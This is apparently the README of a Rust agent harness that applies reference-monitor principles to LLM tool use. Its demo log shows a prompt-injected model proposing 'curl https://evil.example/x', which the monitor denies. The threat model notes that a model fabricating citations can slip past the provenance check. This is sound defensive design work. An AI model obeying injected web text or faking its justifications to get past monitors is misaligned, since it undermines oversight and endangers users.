# anderson

> A minimal LLM-agent harness built on the reference-monitor principles from
> James P. Anderson's *Computer Security Technology Planning Study* (1972).

[![CI](https://github.com/evalops/anderson/actions/workflows/ci.yml/badge.svg)](https://github.com/evalops/anderson/actions/workflows/ci.yml)

The 1972 [Anderson Report] is the founding document of computer security. It
introduced the "malicious user" threat model, the reference monitor concept,
and the three properties any access-control mechanism must satisfy
(tamper-proof, always-invoked, small-enough-to-verify). Half a century later,
the LLM-agent ecosystem is busy re-discovering those principles by shipping
prompt-injected agents and patching individual exploit payloads.

This crate is a runnable proof that the 1972 architecture maps cleanly onto
LLM tool-use. Two of the three reference-monitor properties — *always
invoked* and *small enough to verify* — are enforced structurally in this
codebase. The third — *tamper-proof* — is enforced as far as a single-process
Rust crate can enforce it (no runtime policy, no model-influenceable
configuration). The provenance check that catches prompt-injected exec
proposals is **not** structural; it relies on the model citing its
justifications honestly, and is described as such below.

[Anderson Report]: https://csrc.nist.gov/csrc/media/publications/conference-paper/1998/10/08/proceedings-of-the-21st-nissc-1998/documents/early-cs-papers/ande72.pdf

## What the POC demonstrates

```text
$ cargo run --example injection
ANSWER: I read the page; it tried to instruct me to run a curl command,
        which the monitor refused. Reporting that here instead of executing it.

Audit log:
  NetGet { url: "https://example.com/notes" }  cited=[0]  → ALLOW
  Exec   { cmd: "curl https://evil.example/x" } cited=[1] → DENY: Exec requires
      every cited chunk to carry user authority; chunk(s) [1] are untrusted as intent
```

A prompt-injected model honestly proposes the dangerous action a hostile
webpage asked for. The reference monitor refuses because the cited
justification chunk is `WEB`-provenance, not `USER`-provenance. The model
then revises its plan and stops cleanly. The denial — and the model's
attempt — is recorded in the audit log.

## Reference-monitor properties: which are structural, which aren't

Anderson §3.2.2 specifies three properties any access-control mechanism must
satisfy:

> (a) The reference validation mechanism must be **tamper proof**.
> (b) The reference validation mechanism must **always be invoked**.
> (c) The reference validation mechanism must be **small enough to be subject
>     to analysis and tests, the completeness of which can be assured**.

For an LLM agent, this crate's stance on each:

- **Always invoked — enforced at the type level.** The executor takes
  [`AllowedAction`](src/tools.rs), a token with no public constructor, no
  `Clone` derive, and no `Deserialize` derive. The only path to obtain one is
  [`Monitor::decide`](src/monitor.rs) returning
  [`Verdict::Allow`](src/monitor.rs). A future contributor who tries to add a
  fast path bypassing the monitor gets a compile error.
- **Small enough to verify.** The security kernel is
  [`monitor.rs`](src/monitor.rs) (182 non-test lines),
  [`capability.rs`](src/capability.rs) (187 non-test lines), and
  [`provenance.rs`](src/provenance.rs) (62 lines). 431 lines you can read
  in a sitting.
- **Tamper-proof — within the limits of a single-process design.** The
  monitor consumes only structured `ToolCall` values and a typed
  `Capabilities` bundle; it never reads free-form text from the model and
  has no runtime-configurable policy. A *process-level* attacker who can run
  arbitrary code inside this harness's address space owns everything; for
  defence in depth against that threat, the executor and the monitor should
  live in separate processes — see [future work](#future-work).

## Architecture

```text
USER ──(request + capability bundle)──▶ ORCHESTRATOR
                                            │
                                            ▼
                                builds context with PROVENANCE TAGS
                                            │
                                            ▼
                                       MODEL
                                  (ScriptedModel
                                   or OpenAiModel)
                                            │
                                            ▼
                                emits STRUCTURED ToolCall
                                            │
                                            ▼
                          ┌─────────────────────────────────┐
                          │           MONITOR               │  ◄── the security
                          │   capability check              │      kernel
                          │   per-arg exec patterns         │      no model
                          │   provenance check              │      influence
                          │   spend check                   │
                          │   confirmation check            │
                          └────────────────┬────────────────┘
                                           │
                                returns    │   (Verdict::Allow carries
                  ┌────────────────────────┼────  the AllowedAction token
                  │                        │      the executor demands)
                  │                        │
              Allow(AllowedAction)       Deny                    Escalate
                  │                        │                        │
                  ▼                        ▼                        ▼
        SANDBOXED EXECUTOR        notify model;            halt (POC);
        (subprocess sandbox,      append SYSTEM            real harness
         clearing env, timeout,   chunk; loop              prompts human
         byte cap, O_NOFOLLOW
         writes, post-open
         canonical re-check)
                  │
                  ▼
        result tagged with provenance,
        appended to context, model notified
                  │
                  ▼
        hash-chained audit log
        (in memory; optionally
         fsync'd to JSONL on disk)
```

## Principle → code map

| Anderson principle                             | Where it lives in this crate                                                                                        |
| ---------------------------------------------- | ------------------------------------------------------------------------------------------------------------------- |
| Reference monitor: small / tamper-proof / always-invoked | [`src/monitor.rs`](src/monitor.rs) — 182 non-test lines; no runtime-configurable policy; called via a token type the executor cannot bypass |
| Capability bundle as least-authority grant     | [`src/capability.rs`](src/capability.rs) — allow-lists for FS, network, exec; per-arg patterns for exec; hard limits on calls/steps/wall-clock/byte-caps |
| Authentication of intent (§3.7 analog)         | [`src/provenance.rs`](src/provenance.rs) — every context chunk tagged with its source; `carries_user_authority()` is the trust predicate |
| Tools in their own protection domain (§3.5)    | [`src/tools.rs`](src/tools.rs) — `SandboxedExecutor` uses `sandbox-exec` on macOS / `bwrap` on Linux for `exec`; fails closed elsewhere |
| Post-open path verification                    | [`src/tools.rs`](src/tools.rs) — open the file, then resolve the open fd's canonical path via `F_GETPATH` (macOS) or `/proc/self/fd/N` (Linux); closes the TOCTOU window canonicalize-then-open leaves |
| Symlink-safe writes                            | [`src/tools.rs`](src/tools.rs) — `fs_write` opens with `O_NOFOLLOW` on the leaf; a symlink planted at the target between policy check and write cannot redirect the data |
| Hash-chained, optionally durable audit log     | [`src/audit.rs`](src/audit.rs) — each entry carries the SHA-256 of the previous entry's hash; `JsonlFileSink` writes JSONL with `fsync` after every line |
| Mediated recovery from denials                 | [`src/orchestrator.rs`](src/orchestrator.rs) — denials are surfaced back to the model so it can revise its plan     |
| OpenAI native tool calling                     | [`src/openai.rs`](src/openai.rs) — stateful message history, tool-call IDs preserved across turns, every tool call in a multi-call assistant message goes through the monitor |

## The provenance check is not a structural defence

This is the part of the POC that overpromised in the original framing, and
is now described honestly:

The monitor's "provenance check" — for action classes flagged
`require_user_intent`, **every** cited justification chunk must carry user
or system authority — is a *cooperation-dependent* defence. The model is
required to truthfully declare which context chunks justified its proposed
action. An honest model that does not act on web-provenance intent
succeeds. A prompt-injected model that *honestly* cites the web chunk is
denied. A model that *fabricates* citations (cites only user chunks for an
action actually motivated by a web page) gets past this check.

Why ship it anyway? Three reasons:

1. **It works against the most common failure mode** — a model that has
   been led off-track by hostile context and proposes the corresponding
   action with no attempt to lie about why.
2. **Lying is forensically visible.** A model that cites a user chunk that
   does not request the action it is taking leaves both the citation and
   the user chunk in the audit log, where a follow-up review can detect the
   mismatch.
3. **It composes.** Adding a semantic intent-verifier model (planned, see
   below) over the same citation interface closes the residual gap. The
   structural part of the design — *every action must declare its
   justification chunks* — is the hook the verifier will hang from.

Production deployments should pair this check with the intent verifier, not
rely on it alone.

## Other gaps closed in this revision

The original POC had several places where the implementation was looser
than the README implied. They are now tightened:

- **Per-argument exec policy.** The original `exec: Vec<String>` allow-list
  was program-name-only — `exec: ["curl"]` permitted any URL. The new
  [`ExecRule`](src/capability.rs) requires the operator to declare per-arg
  patterns. A bundle that says "only curl URLs under https://example.com/"
  is now enforceable.
- **Tighter macOS sandbox profile.** The original profile allowed
  `(allow file-read*)` everywhere, so an exec'd `cat /etc/passwd` would
  succeed. The new profile restricts reads to dynamic-linker bootstrap
  paths (`/usr/lib`, `/System`, `/usr/bin`, plus a handful of `/etc`
  entries libc needs at startup). Writes are confined to scratch dirs.
- **TOCTOU defence for fs_read.** The original canonicalised the path then
  opened — a window an attacker could swap a symlink through. The new
  implementation opens first, then resolves the open fd's canonical path
  via `fcntl F_GETPATH` (macOS) or `readlink /proc/self/fd/N` (Linux), and
  rejects if that path is outside the bundle.
- **Symlink-safe fs_write.** Writes use `O_NOFOLLOW` on the leaf: a
  symlink planted at the target between the policy check and the write
  causes the open to fail rather than redirect data.
- **Multi-tool-call assistant turns.** The original processed the first
  tool call and silently synthesised "ignored" tool messages for the rest.
  The new implementation queues every call from an assistant turn and
  drains them one per `next_step`, so each gets full monitor scrutiny.
- **Tamper-evident audit log.** Each entry now carries the SHA-256 of the
  previous entry's hash; `verify_chain` rejects any post-hoc edit.
  `JsonlFileSink` writes the chain to disk with `fsync` after every entry.
- **`bwrap` path discovery on Linux.** The hardcoded `/usr/bin/bwrap`
  failed closed on distros that put it elsewhere. The new code probes
  common paths and `$PATH`.
- **CI.** GitHub Actions workflow runs `cargo fmt --check`, `cargo
  clippy -- -D warnings`, and `cargo test` on macOS and Linux on every
  push.

## What this POC still deliberately does not include

These are real production gaps. Each is a known piece of work, not a bug.

- **Subprocess sandboxing only on macOS/Linux.** Windows fails closed. A
  production harness would also use seccomp-bpf directly on Linux for finer
  control and microVMs (Firecracker, gVisor) for genuine isolation.
- **No signed model weights or signed tool catalog.** Anderson §4.3.1 warned
  about installations accepting OS updates "without question"; weight files,
  system prompts, and MCP server endpoints are the modern analog. A
  production harness would hash-pin and signature-verify all three.
- **No semantic intent verifier.** The provenance check is necessary but not
  sufficient; see [The provenance check is not a structural defence]
  (#the-provenance-check-is-not-a-structural-defence).
- **No streaming.** OpenAI responses are awaited as a whole.
- **No persistent state across sessions.** A real agent harness needs a
  managed memory layer; this POC has none.
- **Escalation halts the session.** A real harness would pause for human
  input on the specific call rather than aborting the session.
- **macOS uses Apple-deprecated `sandbox-exec`.** It works on every Mac but
  has been deprecated since 10.7 and its profile language is undocumented.
  A production harness on macOS should layer a microvm executor on top.
- **fs_write's parent-symlink window.** The leaf is opened `O_NOFOLLOW`,
  but a symlink swap on the *parent directory* between `canonicalize` and
  the write still races. Closing it requires `openat` walks on every path
  component (future work).

## Running

### Prerequisites

- Rust 1.75+ (uses 2021 edition; `rustc --version` should show ≥ 1.75).
- For sandboxed `exec`: macOS (ships `sandbox-exec`) or Linux with `bwrap`
  installed on PATH. Other platforms fail closed on `exec`.

### Demos (no API key required)

```sh
# Benign session: agent reads /etc/hosts on the user's request.
cargo run --example benign

# Prompt-injection demo: hostile webpage tries to escalate; monitor blocks;
# model recovers; session completes.
cargo run --example injection
```

### Live OpenAI session

```sh
export OPENAI_API_KEY=sk-...
# Optional, defaults to gpt-4o-mini:
export ANDERSON_MODEL=gpt-4o-mini

cargo run --example openai_chat -- "What's in /etc/hosts?"
```

The session's capability bundle permits only `fs_read` on `/etc/hosts`. Try
asking the model to read `/etc/passwd` instead and watch the monitor refuse,
the model see the denial in its tool message history, and the model recover.

### CLI

```sh
cargo run -- benign
cargo run -- injection
cargo run -- openai -- "your prompt here"
cargo run -- openai --model gpt-4o "your prompt"
```

### Tests

```sh
cargo test
```

22 tests run by default — 16 unit, 6 integration. The integration tests in
`tests/security_invariants.rs` are the load-bearing security claims of this
project asserted as executable expectations.

## Threat model

**Defended:**

- Prompt injection from untrusted content (web pages, retrieved documents,
  file contents) inducing a non-lying model to propose dangerous actions
  on the user's behalf.
- Exhaustion attacks (model loops, denial loops, runaway tool calls).
- TOCTOU/symlink escape from the FS allow-list on read (post-open
  verification) and on write (O_NOFOLLOW on the leaf).
- Unrestricted exec privilege (sandbox + cleared env + timeout + byte cap
  + per-arg patterns).
- Unrestricted network egress (allow-list + timeout + byte cap).
- Bypassing the monitor by calling the executor directly (compile-time
  prevented via [`AllowedAction`](src/tools.rs)).
- Post-hoc audit-log edits (hash chain detects them).

**Not defended:**

- A model that *fabricates* citations to slip past the provenance check.
  (Semantic intent verifier needed; see future work.)
- Compromise of the model weights, system prompt, or tool catalog. (Supply
  chain pinning needed.)
- Side channels (cache timing, token-count signals to a colluding tool).
- The platform sandbox itself failing. `sandbox-exec` is deprecated;
  `bwrap` requires careful configuration.
- Physical access, host OS compromise, hardware-level attacks.
- Symlink swap on a parent directory of an `fs_write` target. The leaf is
  `O_NOFOLLOW`, but the parent chain is not.
- A process-level attacker inside the harness's address space. The monitor
  is in-process; defence in depth requires a multi-process design.
- A live attacker with write access to the audit file. The hash chain is
  tamper-*evident*, not tamper-*proof*; full chains can be replaced.

## Future work

- **Semantic intent verifier.** A second LLM pass asked to evaluate whether
  cited user chunks actually request the proposed action, before allowing it.
- **Out-of-process monitor.** Move the monitor (or just the executor) into
  a separate process and IPC verdicts across, so a process-level attacker in
  the model integration cannot reach the monitor's state directly.
- **Supply chain pinning.** Hash-pin model versions, sign tool catalogs, sign
  the system prompt, authenticate MCP server endpoints.
- **Per-call credential issuance.** Tools receive short-lived scoped tokens
  derived from the capability bundle rather than ambient credentials.
- **Streaming.** Allow incremental processing of model responses.
- **`openat` walks for fs_write.** Close the parent-symlink race on write
  by walking the path component-by-component with `O_NOFOLLOW`.
- **Linux: native seccomp-bpf.** Replace the `bwrap` shim with a Rust
  seccomp policy applied via `prctl` in `pre_exec` for finer control.
- **Microvm executor.** For high-risk environments, run `exec` inside a
  Firecracker microvm with no network and a tmpfs root.

## License

Dual-licensed under either of:

- Apache License, Version 2.0 ([LICENSE-APACHE](LICENSE-APACHE))
- MIT License ([LICENSE-MIT](LICENSE-MIT))

at your option.

## Acknowledgements

The intellectual debt to James P. Anderson and the 1972 panel — E. L. Glaser,
Roger Schell, Steven Lipner, Daniel Edwards, Hilda Faust, Eldred Nelson,
Bruce Peters, Charles Rose, Clark Weissman, Melvin Conway — is in every
module of this crate. Read the original [report]; the LLM-agent translation
writes itself.

[report]: https://csrc.nist.gov/csrc/media/publications/conference-paper/1998/10/08/proceedings-of-the-21st-nissc-1998/documents/early-cs-papers/ande72.pdf
